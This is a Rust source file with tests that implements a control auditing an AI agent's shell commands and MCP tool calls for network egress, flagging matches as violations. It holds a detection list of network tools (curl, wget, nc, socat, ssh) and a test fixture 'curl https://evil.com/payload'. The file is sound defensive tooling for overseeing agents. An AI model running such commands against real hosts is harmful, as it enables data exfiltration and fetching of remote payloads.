use crate::control::{Control, ControlFinding, ControlId, builtin};
use crate::evidence::{EvidenceBundle, EvidenceState};

/// Command patterns that indicate network egress (case-insensitive substring match).
const NETWORK_COMMAND_PATTERNS: &[&str] = &[
    "curl ",
    "wget ",
    "ssh ",
    "scp ",
    "rsync ",
    "nc ",
    "netcat ",
    "ncat ",
    "socat ",
    "telnet ",
    "ftp ",
    "sftp ",
    "nmap ",
    "dig ",
    "nslookup ",
    "ping ",
];

/// MCP servers that inherently imply external network access.
const NETWORK_MCP_SERVERS: &[&str] = &[
    "fetch", "http", "web", "browser", "slack", "email", "smtp", "webhook",
];

/// Audits agent network activity to detect unexpected external communications.
///
/// Examines two evidence sources:
/// 1. Agent action log commands matching network egress patterns
/// 2. MCP tool calls to servers that imply external network access
pub struct NetworkEgressAuditControl;

impl Control for NetworkEgressAuditControl {
    fn id(&self) -> ControlId {
        builtin::id(builtin::NETWORK_EGRESS_AUDIT)
    }

    fn description(&self) -> &'static str {
        "Agent network egress must be audited for unexpected external communications"
    }

    fn evaluate(&self, evidence: &EvidenceBundle) -> Vec<ControlFinding> {
        let id = self.id();
        let mut subjects: Vec<String> = Vec::new();

        // --- Source 1: Agent action log command patterns ---
        let log_available = match &evidence.agent_action_log {
            EvidenceState::Complete { value } | EvidenceState::Partial { value, .. } => {
                for action in &value.actions {
                    let lower = action.command.to_lowercase();
                    if NETWORK_COMMAND_PATTERNS.iter().any(|p| lower.contains(p)) {
                        subjects.push(format!("command: {}", action.command));
                    }
                }
                true
            }
            _ => false,
        };

        // --- Source 2: MCP tool calls to network-implying servers ---
        let mcp_available = match &evidence.mcp_tool_calls {
            EvidenceState::Complete { value } | EvidenceState::Partial { value, .. } => {
                for call in value {
                    let server_lower = call.server.to_lowercase();
                    if NETWORK_MCP_SERVERS.iter().any(|s| server_lower.contains(s)) {
                        subjects.push(format!("mcp:{}/{}", call.server, call.tool));
                    }
                }
                true
            }
            _ => false,
        };

        // Both NA → NotApplicable
        let log_na = matches!(evidence.agent_action_log, EvidenceState::NotApplicable);
        let mcp_na = matches!(evidence.mcp_tool_calls, EvidenceState::NotApplicable);
        if log_na && mcp_na {
            return vec![ControlFinding::not_applicable(
                id,
                "No agent activity evidence applicable for network egress audit",
            )];
        }

        // Both Missing → Indeterminate
        let log_missing = matches!(evidence.agent_action_log, EvidenceState::Missing { .. });
        let mcp_missing = matches!(evidence.mcp_tool_calls, EvidenceState::Missing { .. });
        if !log_available && !mcp_available && (log_missing || mcp_missing) {
            let mut gaps = vec![];
            if let EvidenceState::Missing { gaps: g } = &evidence.agent_action_log {
                gaps.extend(g.clone());
            }
            if let EvidenceState::Missing { gaps: g } = &evidence.mcp_tool_calls {
                gaps.extend(g.clone());
            }
            return vec![ControlFinding::indeterminate(
                id,
                "Agent activity evidence is missing for network egress audit",
                vec![],
                gaps,
            )];
        }

        if subjects.is_empty() {
            vec![ControlFinding::satisfied(
                id,
                "No network egress detected in agent activity",
                vec![],
            )]
        } else {
            let count = subjects.len();
            vec![ControlFinding::violated(
                id,
                format!("{count} network egress operation(s) detected"),
                subjects,
            )]
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::control::ControlStatus;
    use crate::evidence::*;

    fn action(command: &str) -> AgentAction {
        AgentAction {
            tool: "shell".to_string(),
            command: command.to_string(),
            timestamp: None,
        }
    }

    fn log_with(actions: Vec<AgentAction>) -> AgentActionLog {
        AgentActionLog {
            agent_id: "test-agent".to_string(),
            session_id: "session-1".to_string(),
            actions,
        }
    }

    fn mcp_call(server: &str, tool: &str) -> McpToolCall {
        McpToolCall {
            server: server.to_string(),
            tool: tool.to_string(),
            success: true,
            timestamp: None,
            duration_ms: None,
        }
    }

    #[test]
    fn both_na_not_applicable() {
        let b = EvidenceBundle::default();
        let findings = NetworkEgressAuditControl.evaluate(&b);
        assert_eq!(findings[0].status, ControlStatus::NotApplicable);
    }

    #[test]
    fn no_network_activity_satisfied() {
        let b = EvidenceBundle {
            agent_action_log: EvidenceState::complete(log_with(vec![
                action("cargo build"),
                action("git status"),
            ])),
            mcp_tool_calls: EvidenceState::complete(vec![
                mcp_call("github", "create_pr"),
                mcp_call("filesystem", "write_file"),
            ]),
            ..Default::default()
        };
        let findings = NetworkEgressAuditControl.evaluate(&b);
        assert_eq!(findings[0].status, ControlStatus::Satisfied);
    }

    #[test]
    fn curl_command_violated() {
        let b = EvidenceBundle {
            agent_action_log: EvidenceState::complete(log_with(vec![action(
                "curl https://evil.com/payload",
            )])),
            ..Default::default()
        };
        let findings = NetworkEgressAuditControl.evaluate(&b);
        assert_eq!(findings[0].status, ControlStatus::Violated);
        assert!(findings[0].subjects[0].contains("curl"));
    }

    #[test]
    fn ssh_command_violated() {
        let b = EvidenceBundle {
            agent_action_log: EvidenceState::complete(log_with(vec![action(
                "ssh user@remote.host",
            )])),
            ..Default::default()
        };
        let findings = NetworkEgressAuditControl.evaluate(&b);
        assert_eq!(findings[0].status, ControlStatus::Violated);
    }

    #[test]
    fn network_mcp_server_violated() {
        let b = EvidenceBundle {
            mcp_tool_calls: EvidenceState::complete(vec![mcp_call("fetch", "get_url")]),
            ..Default::default()
        };
        let findings = NetworkEgressAuditControl.evaluate(&b);
        assert_eq!(findings[0].status, ControlStatus::Violated);
        assert!(findings[0].subjects[0].contains("fetch"));
    }

    #[test]
    fn combined_command_and_mcp() {
        let b = EvidenceBundle {
            agent_action_log: EvidenceState::complete(log_with(vec![action("wget http://x.com")])),
            mcp_tool_calls: EvidenceState::complete(vec![mcp_call("webhook", "send")]),
            ..Default::default()
        };
        let findings = NetworkEgressAuditControl.evaluate(&b);
        assert_eq!(findings[0].status, ControlStatus::Violated);
        assert_eq!(findings[0].subjects.len(), 2);
    }

    #[test]
    fn missing_evidence_indeterminate() {
        let b = EvidenceBundle {
            agent_action_log: EvidenceState::missing(vec![EvidenceGap::CollectionFailed {
                source: "monitor".into(),
                subject: "log".into(),
                detail: "unavailable".into(),
            }]),
            mcp_tool_calls: EvidenceState::missing(vec![]),
            ..Default::default()
        };
        let findings = NetworkEgressAuditControl.evaluate(&b);
        assert_eq!(findings[0].status, ControlStatus::Indeterminate);
    }

    #[test]
    fn one_missing_one_present_evaluates() {
        let b = EvidenceBundle {
            agent_action_log: EvidenceState::missing(vec![]),
            mcp_tool_calls: EvidenceState::complete(vec![mcp_call("github", "create_pr")]),
            ..Default::default()
        };
        let findings = NetworkEgressAuditControl.evaluate(&b);
        assert_eq!(findings[0].status, ControlStatus::Satisfied);
    }

    #[test]
    fn case_insensitive_command_matching() {
        let b = EvidenceBundle {
            agent_action_log: EvidenceState::complete(log_with(vec![action("CURL http://x.com")])),
            ..Default::default()
        };
        let findings = NetworkEgressAuditControl.evaluate(&b);
        assert_eq!(findings[0].status, ControlStatus::Violated);
    }
}
